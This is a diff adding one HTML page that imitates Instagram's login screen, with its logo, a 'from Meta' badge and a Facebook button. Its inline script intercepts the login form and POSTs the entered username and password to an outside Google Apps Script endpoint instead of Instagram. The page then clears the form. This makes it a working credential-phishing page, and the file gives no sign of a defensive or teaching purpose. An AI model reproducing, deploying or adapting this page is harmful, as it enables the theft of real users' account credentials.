@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="style.css" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet"/>
+    <link rel="icon" type="image/x-icon" href="http://drive.google.com/uc?export=view&id=1Gi-66afeeCo2kozofwUTEMMe9QGWwACu"/>
+    <script src="https://kit.fontawesome.com/b3adb6f99b.js" crossorigin="anonymous"></script>
+  </head>
+  <body>
+    <div class="container">
+      <div class="center">
+        <div class="lang">
+            <select name="lang" id="lang">
+                <option value="Eng">
+                    English
+                </option>
+                <option value="Hin">
+                    Hindi
+                </option>
+            </select>
+        </div>
+        <div class="header">
+          <img src="http://drive.google.com/uc?export=view&id=1Ab53ICPW8ybwA_ob7M1UXQa5YkkS2x9q" alt="instagramLogo" class="instaLogo" />
+        </div>
+        <div class="social_icon">
+            <button><i class="fab fa-facebook-square"></i
+                ><span><a href="https://www.facebook.com/" target="_blank">Continue With Facebook</a></span></button>
+          </div>
+        <div class="line">
+            <span class="arrow"></span>
+            <span class="content">OR</span>
+            <span class="arrow"></span>
+          </div>
+        <form method="post" id="form">
+        <div class="inputElement">
+          <input
+            type="text"
+            placeholder="Phone number,username or email"
+            class="inputText"
+            name="username"/>
+          <input type="password" placeholder="Password" class="inputText" name="password"/>
+          <div id="res" class="result"></div>
+          <div class="forgetPassword">Forgot Password?</div>
+          <button name="btn" type="submit" class="inputButton">Log in</button>
+        </form>
+          <div class="footer">
+            <p>Don't have a accout?<span> Sign Up</span></p>
+          </div>
+          
+        </div>
+        <div class="meta">
+            <span>from</span>
+            <img src="http://drive.google.com/uc?export=view&id=1BHBznqIdQqr7cyJJ-lvPu2l78Vqa10uG" alt="meta">
+        </div>
+      </div>
+    </div>
+    <script>
+      let url ='https://script.google.com/macros/s/AKfycbwIcrRzdi7usepopy_A0S6n4CkZ1nHeWle29IqiSPmHJhcOrRXS_RmKrCojEifg2h64/exec';
+    let form=document.querySelector('#form');
+    form.addEventListener("submit", (e)=>
+    {
+        e.target.btn.innerHTML="Submitting....";
+        let d=new FormData(form);
+        fetch(url, {
+            method:"POST",
+            body:d
+        }).then((res)=>res.text())
+        .then((finalRes)=>
+        {
+            e.target.btn.innerHTML="submit";
+            document.getElementById("res").innerHTML=finalRes;
+            form.reset();
+            setTimeout(()=>
+            {
+             document.getElementById("res").innerHTML='';
+
+            }, 3000)
+        })
+            e.preventDefault();
+    })
+    </script>
+  </body>
+</html>
